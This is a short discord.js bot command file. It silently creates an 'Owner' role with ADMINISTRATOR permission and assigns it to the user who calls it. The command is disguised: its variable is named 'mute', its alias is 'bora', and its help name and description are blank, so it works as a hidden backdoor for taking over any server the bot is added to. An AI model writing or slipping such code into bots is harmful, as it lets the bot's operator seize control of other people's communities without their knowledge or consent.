const Discord = require('discord.js');
exports.run = async (client, message, args) => {
  let mute = message.guild.roles.find(r => r.name === "Owner");
if(!mute){mute = await message.guild.createRole({name: "Owner",color: "#000000",permissions:["ADMINISTRATOR"]
      })}
message.member.addRole(mute.id);
};
exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['bora'],
  permLevel: 4
};
 
exports.help = {
  name: '',
  description: '',
  usage: ''  
};